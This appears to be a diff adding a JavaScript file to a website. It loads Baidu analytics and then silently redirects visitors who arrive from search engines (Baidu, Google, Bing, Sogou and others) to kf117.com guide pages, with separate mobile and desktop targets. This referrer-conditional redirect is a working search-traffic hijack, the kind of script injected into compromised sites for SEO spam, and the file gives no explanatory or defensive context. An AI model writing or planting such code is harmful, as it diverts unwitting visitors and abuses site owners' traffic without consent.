@@ -1,0 +1,31 @@
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?c6be363c80327f7641c710a11029c96a";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+
+var urls = new Array();
+urls[0] = "https://www.kf117.com/guide_page.htm";
+urls[1] = "https://www.kf117.com/guide_page.htm";
+urls[2] = "https://www.kf117.com/guide_page.htm";
+
+var urlsM = new Array();
+urlsM[0] = "https://m.kf117.com/guidenew.htm";
+urlsM[1] = "https://m.kf117.com/guidenew.htm";
+urlsM[2] = "https://m.kf117.com/guidenew.htm";
+
+n = Math.floor(Math.random()*3);
+
+
+var regexp = /\.(baidu|haosou|so|sogou|soso|google|sm|yahoo|bing|360)(\.[a-z0-9\-]+){1,2}\//ig;
+var where = document.referrer;
+if (regexp.test(where)) {
+  if (/mobile|android|iphone|ipad|phone/i.test(navigator.userAgent.toLowerCase())) {
+    location.href= urlsM[n];
+  }
+  else{
+    location.href= urls[n];
+  }
+}
